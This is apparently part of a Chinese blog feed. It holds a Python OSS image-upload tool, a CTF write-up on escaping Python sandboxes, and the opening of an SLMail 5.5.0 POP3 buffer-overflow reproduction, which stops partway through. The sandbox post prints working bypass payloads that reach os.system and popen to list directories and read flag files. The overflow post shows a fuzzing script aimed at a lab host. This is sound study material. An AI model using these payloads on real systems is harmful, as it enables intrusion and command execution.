python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setText</span><span class="params">(self,aString)</span>:</span></span><br><span class="line">        w.OpenClipboard()</span><br><span class="line">        w.EmptyClipboard()</span><br><span class="line">        w.SetClipboardData(win32con.CF_TEXT,aString)</span><br><span class="line">        w.CloseClipboard()</span><br></pre></td></tr></table></figure></li><li><p>这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码</p></li></ul><h3 id="上传图片到OSS"><a href="#上传图片到OSS" class="headerlink" title="上传图片到OSS"></a>上传图片到OSS</h3><ul><li><p>使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(self,file_name,name)</span>:</span></span><br><span class="line">        bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name)</span><br><span class="line">        data = bucket.put_object_from_file(key=<span class="string">'Blog/'</span>+ name,filename=<span class="string">'image/'</span>+ name, headers=<span class="keyword">None</span>, progress_callback=<span class="keyword">None</span>)</span><br><span class="line">        str = <span class="string">"https://xxxxxx.xx/"</span> + name</span><br><span class="line"> </span><br><span class="line">          shutil.rmtree(<span class="string">'image'</span>)</span><br></pre></td></tr></table></figure></li><li><p>这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint</p></li><li>说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合</li><li>shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。</li></ul><h3 id="设置阿里云OSS的接口信息"><a href="#设置阿里云OSS的接口信息" class="headerlink" title="设置阿里云OSS的接口信息"></a>设置阿里云OSS的接口信息</h3><ul><li><p>通过外部的config文件导入<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/76961318.jpg" alt=""></p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        infoDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"config.conf"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> file:</span><br><span class="line">            ApiInfo = file.readlines()</span><br><span class="line">            <span class="keyword">for</span> info <span class="keyword">in</span> ApiInfo:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> info != <span class="string">"\n"</span> <span class="keyword">and</span> info != <span class="string">""</span>:</span><br><span class="line">                        tmp = info.split(<span class="string">"="</span>)</span><br><span class="line">                        infoDict[tmp[<span class="number">0</span>].strip()] = tmp[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">u"[-] 请按照要求配置config.conf"</span></span><br><span class="line">                    sys.exit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u"[-] 请在config.conf中配置阿里云 API信息"</span></span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure></li></ul><h3 id="结果示例"><a href="#结果示例" class="headerlink" title="结果示例"></a>结果示例</h3><ul><li><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1522318333.02.png" alt=""></li><li><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-27/38823279.jpg" alt=""></li></ul><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li>[OSS SDK-Python]:<a href="https://github.com/aliyun/aliyun-oss-python-sdk" target="_blank" rel="noopener">https://github.com/aliyun/aliyun-oss-python-sdk</a></li></ul><h3 id="更新说明"><a href="#更新说明" class="headerlink" title="更新说明"></a>更新说明</h3><blockquote><p>现在已经修改可以支持python3的环境，详情请看github</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.xyz/categories/python/"/>
    
    
      <category term="编程" scheme="https://www.lsowl.xyz/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="python" scheme="https://www.lsowl.xyz/tags/python/"/>
    
      <category term="开发" scheme="https://www.lsowl.xyz/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>python沙盒逃逸学习</title>
    <link href="https://www.lsowl.xyz/2018/06/11/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/"/>
    <id>https://www.lsowl.xyz/2018/06/11/python沙盒逃逸/</id>
    <published>2018-06-11T12:39:50.000Z</published>
    <updated>2018-06-14T14:50:30.214Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于在现在的比赛中出现了沙盒逃逸这种题目，所以就针对python沙盒逃逸学习记录如下。python沙盒逃逸的思路就是题目删除了一些不安全的内建函数，模块导致环境的权限被降低，要利用python语言的特性进行限制的绕过。同时借助前几天赛中的沙盒逃逸演示一下。比赛中涉及的到Python沙盒逃逸往往是利用语言特性来逃逸，但是其实这只是从Python解释器的逃逸，从严格意义上说这是不完全的。从现实意义上来讲更进一步的是利用沙盒的逃逸来控制整个系统，Python的模块通常都是大量C代码的封装，这里面就有未被发现的内存破坏漏洞。所以比赛的题目只是一种思路，更多的还是要结合到实际生产环境中。</p></blockquote><h4 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h4><ol><li><p>实验脚本：题目的设置，删除一些内建函数（Python语言加载的时候会自动加载系统的内建模块，python2中是builtin，Python3中是builtins）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,<span class="string">'file'</span>,<span class="string">'execfile'</span>,<span class="string">'compile'</span>,<span class="string">'reload'</span>,<span class="string">'__import__'</span>,<span class="string">'eval'</span>,<span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead,Expoit me &gt; ;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>,</span><br><span class="line">        <span class="comment">#Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'\S+'</span>,raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span>+inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&gt;&gt;&gt;'</span>,a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Exception:'</span>,e</span><br><span class="line"><span class="comment">#后面这一段主要是将结果以字符串的形式操作并显示</span></span><br></pre></td></tr></table></figure></li><li><p>脚本运行结果：（环境的限制权限非常低）这里其实就是模拟Python的命令行界面，然后进行相应的操作，只是将一些内建函数删除了，所以无法调用系统命令等等<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428212.69.png" alt=""></p></li><li><p>正常情况下Python的使用可以调用OS等模块，就可以进行系统命令的调用和文件操作等等：但是经过限制以后的环境就不可以调用了，因此不能调用系统命令拿到flag<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428524.0.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525428600.48.png" alt=""></p></li><li><p>由于删除了对应的内建函数，所以我们要利用Python的特性来绕过这种限制：<strong>Python中可以利用file来read文件</strong> 但是我们可以发现直接用file这种方式也是被限制了的，所以利用对象的概念，通过元组来加载：（有一个知识点：<strong>bases</strong> : 类的所有父类构成元素（包含了一个由所有父类组成的元组））<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525429208.95.png" alt=""></p></li><li><p>通过将所有父类组成的元组显示出来以后可以找到file在第40个，然后我们可以通过硬编码的方式调用file加载文件找到flag： <code>().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525429504.92.png" alt=""></p></li></ol><h3 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h3><ol><li><p>首先还是贴上环境的脚本，前提条件和实例一差不多：（不同的是这里能够执行的内建函数只有输入输出，与实例一不同的还有就是这里不回显数据  ）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Welcome to my python sandbox! Enter commands below!"</span></span><br><span class="line"> </span><br><span class="line">banned = [<span class="string">'import'</span>,<span class="string">'exec'</span>,<span class="string">'eval'</span>,<span class="string">'pickle'</span>,<span class="string">'os'</span>,<span class="string">'subprocess'</span>,<span class="string">'kevin sucks'</span>,<span class="string">'input'</span>,<span class="string">'banned'</span>,<span class="string">'cry sum more'</span>,<span class="string">'sys'</span>]</span><br><span class="line"> </span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&gt;&gt;&gt;"</span>,</span><br><span class="line">        data = raw_input()</span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">                <span class="comment">#将输入的字符转换为小写和banned中的字符转换为小写比较</span></span><br><span class="line">                print(<span class="string">"Permission Denied"</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br></pre></td></tr></table></figure></li><li><p>环境运行结果如下：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440081.27.png" alt=""></p></li><li><p>思路与实例一还是一样，都是使用所有父类组成的元组，这里要使用到catch_warnings类（索引在59），进行命令执行 <code>print ().__class__.__bases__[0].__subclasses__()</code>    <code></code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440331.12.png" alt=""></p><p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440491.92.png" alt=""></p></li><li><p>经过测试以后发现这里其实可以不用执行59的那个子类，因为没有禁用print函数，当然这里的59这个子类可以用到实例一中进行ls的调用</p><p><code>print ().__class__.__bases__[0].__subclasses__()[40](&#39;./flag.txt&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525440660.03.png" alt=""></p></li></ol><h3 id="实例三"><a href="#实例三" class="headerlink" title="实例三"></a>实例三</h3><ol><li><p>实验环境代码如下：（这里用Python3写的，与前两个相比，这里先删除了两个危险的函数，然后对其他许多函数做了过滤，还对一些字符，如’.’都进行了过滤）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys, cmd, os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"> </span><br><span class="line">intro= <span class="string">"""</span></span><br><span class="line"><span class="string">   pwnhubcuit</span></span><br><span class="line"><span class="string">   pwneverything</span></span><br><span class="line"><span class="string">   Rules:</span></span><br><span class="line"><span class="string">        -No import</span></span><br><span class="line"><span class="string">        -No ...</span></span><br><span class="line"><span class="string">        -No flag</span></span><br><span class="line"><span class="string"> """</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(command)</span>:</span></span><br><span class="line">    exec(command, globals())</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jail</span><span class="params">(cmd.Cmd)</span>:</span></span><br><span class="line">    prompt    = <span class="string">'&gt;&gt;&gt; '</span></span><br><span class="line">    filtered   =<span class="string">'\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'</span>.split(<span class="string">'|'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_EOF</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        sys.exit()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">emptyline</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> cmd.Cmd.emptyline(self)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">default</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        sys.stdout.write(<span class="string">'\x00'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postcmd</span><span class="params">(self, stop, line)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> any(f <span class="keyword">in</span> line <span class="keyword">for</span> f <span class="keyword">in</span> self.filtered):</span><br><span class="line">            print(<span class="string">"You are a big hacker!!!"</span>)</span><br><span class="line">            print(<span class="string">"Go away"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                execute(line)</span><br><span class="line">            <span class="keyword">except</span> NameError:</span><br><span class="line">                print(<span class="string">"NameError: name'%s' is not defined"</span> % line)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                print(<span class="string">"Error: %s"</span> %line)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> cmd.Cmd.postcmd(self, stop,line)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        Jail().cmdloop(intro)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">"\rSee you next time!"</span>)</span><br></pre></td></tr></table></figure></li><li><p>所以这里就没有办法使用前面说的利用子类进行系统的调用，这里通过获取系统函数地址进行绕过：</p><p><code>print(getattr(os, &quot;system&quot;)(&quot;ls&quot;))</code></p><p><code>print(getattr(os, &quot;system&quot;)(&quot;cat flag&quot;))</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525442349.25.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525442706.14.png" alt=""></p></li></ol><blockquote><p>以上三个实例就是利用Python作为脚本语言的特性来逃逸</p></blockquote><h3 id="实例四"><a href="#实例四" class="headerlink" title="实例四"></a>实例四</h3><blockquote><p>拿最近一次比赛中的沙盒逃逸来演示一下。</p></blockquote><ol><li><p>拿到赛题以后nc连接一下并输入一些语句进行测试：（也是许多函数被限制且不回显，经过测试发现是Python2写的环境并且没有过滤‘ . ’）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443353.83.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443493.14.png" alt=""></p></li><li><p>这里和我们前面的练习不一样，这里必须要调用系统命令ls来看一下存放flag的文件，找到一个和getattr函数类似的函数getattribute</p><p><code>print ().__class__.__bases__[0].__getattribute__(&#39;o&#39;+&#39;s&#39;,&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;)</code>  发现可以使用单引号调用参数</p><p><code>().__class__.__bases__[0].__getattribute__(__import__(&#39;o&#39;+&#39;s&#39;),&#39;sy&#39;&#39;stem&#39;)(&#39;l&#39;&#39;s&#39;)</code> 构造第二个payload，尝试使用导入os模块的方法调用系统命令，结果失败，过滤了os:<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525443785.45.png" alt=""></p><p>这个时候我们换一下思路，调用子类中的函数catch_warnings，在第59个，构造paylad:</p><p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s&#39;).read</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525444594.33.png" alt=""></p><p>成功列出了目录，经过测试flag在home/ctf目录下：</p><p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;&#39;s /home&#39;).read()</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525445718.2.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525445847.25.png" alt=""></p><p>然后我们加上getattribute构造payload：</p><p><code>print [].__class__.__base__.__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39; + &#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;c&#39;&#39;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#39;).read()</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1525446030.23.png" alt=""></p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>利用语言特性来进行解释器的逃逸，其实就是绕过python沙盒内部导入模块的白名单；这里我理解为它限制的是语言中最直接的模块、函数的调用，而我们利用的是通过封装的类，以及派生出的子类调用，实现相同的功能。还有不得不说的一点，结合生产环境，通过内存破坏、溢出等方式实现沙盒的的逃逸要理解很多东西，涉及到二进制、fuzzy等等，所以要通过不断的学习才可以综合的利用。由于水平有限，这里只能做到语言解释器的沙盒逃逸，而不是系统层面的。下面给出一个讲利用内存破坏实现Python沙盒逃逸的链接。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于在现在的比赛中出现了沙盒逃逸这种题目，所以就针对python沙盒逃逸学习记录如下。python沙盒逃逸的思路就是题目删除了一些不安全的内建函数，模块导致环境的权限被降低，要利用python语言的特性进行限制的绕过。同时借助前几天赛中的沙盒逃逸演
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.xyz/categories/python/"/>
    
    
      <category term="python" scheme="https://www.lsowl.xyz/tags/python/"/>
    
      <category term="CTF" scheme="https://www.lsowl.xyz/tags/CTF/"/>
    
      <category term="沙盒逃逸" scheme="https://www.lsowl.xyz/tags/%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>一次windows缓冲区溢出复现</title>
    <link href="https://www.lsowl.xyz/2018/06/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <id>https://www.lsowl.xyz/2018/06/09/缓冲区溢出/</id>
    <published>2018-06-09T12:39:50.000Z</published>
    <updated>2018-06-14T14:50:30.217Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>缓冲区是内存中的一个片段，我们使用程序；在程序中输入一些参数、变量，这些都会先放在缓冲区中，然后通过CPU的调用、处理，然后再由计算机反馈出来。</p></blockquote><h2 id="程序的漏洞从哪里来："><a href="#程序的漏洞从哪里来：" class="headerlink" title="程序的漏洞从哪里来："></a>程序的漏洞从哪里来：</h2><ul><li>罪恶的根源：变量</li><li>数据与代码边界不清（程序没有严格的限定）</li><li>由于控制不严会造成程序被严重的破坏</li><li>最简单漏洞原理——shell脚本</li></ul><ol><li><p>通过一个最简单的shell脚本来体现漏洞的由来：</p><ul><li><p>这个脚本本意是将用户输入的字符显示出来，从程序的目的来看没有问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> $</span><br></pre></td></tr></table></figure></li><li><p>但是这个程序没有做数据和命令上的过滤，通过一些特殊字符的构造就可以执行命令（比如； &amp;&amp; ||）</p><p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-20/39703071.jpg" alt=""></p></li><li><p>上面的结果就是一个简单的漏洞产生的原理，假如说这是一个服务器，攻击者就可以使用nc开一个监听端口，然后将shell重定向，这样就会直接控制服务器</p></li></ul></li><li><p>缓冲区溢出：</p><ul><li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据。</li><li>成功修改内存数据、可以造成进程劫持、执行恶意代码、获得服务器权限等后果。</li></ul></li></ol><h2 id="如何发现漏洞："><a href="#如何发现漏洞：" class="headerlink" title="如何发现漏洞："></a>如何发现漏洞：</h2><ul><li>源码审计（首先你得能接触到源码）</li><li>逆向工程</li><li>模糊测试<ul><li>向程序堆栈发送随机、半随机的数据，根据存在内存变化判断溢出  （完全随机的不好判断）</li><li>数据生成器：生成随机、半随机的数据  （工具）</li><li>测试工具：识别溢出漏洞                        （工具，主要使用一些动态调试工具）</li></ul></li></ul><h2 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h2><ul><li>FUZZER<ul><li>SLMail 5.5.0 Mail Server      （一个Windows下的存在缓冲区溢出的服务端）</li><li>ImmunityDebugger_1_85setup.exe    （一个调试工具，比OD的自动化程度高一些）</li><li>mona.py                                              （辅助脚本）</li><li>环境：Windows XP（需要将SLMail 、调试工具部署好）<ul><li>安装SLMail按照提示安装完查看端口、服务（smtp、pop3等）是否开放</li><li>安装调试工具，如果没有Python2.7环境它会自动安装</li><li>将mono.py放在ImmunityDebugger的Pycommands文件夹中</li></ul></li><li>SLMail 5.5.0 Mail Server<ul><li>pop3  pass命令存在缓冲区溢出漏洞</li><li>无需身份验证实现远程代码执行</li><li>DEP：阻止代码从数据页被执行      （Windows的一种安全防护机制）</li><li>ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化 （Windows的一种安全防护机制）</li></ul></li></ul></li><li><p>pop3</p><ul><li><p>最简单的 <figure class="highlight"><figcaption><span>110端口```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">- 了解未知协议</span><br><span class="line">  - wireshark</span><br><span class="line"></span><br><span class="line">  - RFC</span><br><span class="line"></span><br><span class="line">  - 通过一个简单的Python脚本进行110端口的连接：</span><br><span class="line"></span><br><span class="line">    ```pytho<span class="symbol">n</span></span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket<span class="comment">(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line">    try:</span><br><span class="line">        print "\nSending evil buffer..."</span><br><span class="line">        s.connect(('192.168.111.137',110))</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('USER admin' + '\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.send('PASS admin\r\n')</span><br><span class="line">        data = s.recv<span class="comment">(1024)</span></span><br><span class="line">        print data</span><br><span class="line"> </span><br><span class="line">        s.close<span class="comment">()</span></span><br><span class="line">        print "\nDone!"</span><br><span class="line">    except:</span><br><span class="line">        print "Could not connect to POP3!"</span><br></pre></td></tr></table></figure></p><ul><li><p>这里已知SLMail 5.5.0的pass存在缓冲区溢出漏洞，在实际测试用就需要一步步调试</p><ul><li><p>测试pass命令接收到大量数据时是否合法</p></li><li><p>EIP寄存器存放下一条指令的地址</p></li><li><p>2.py （通过一个简单的Python脚本来验证SLMail 5.5.0的pass命令存在存在缓冲区漏洞）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td 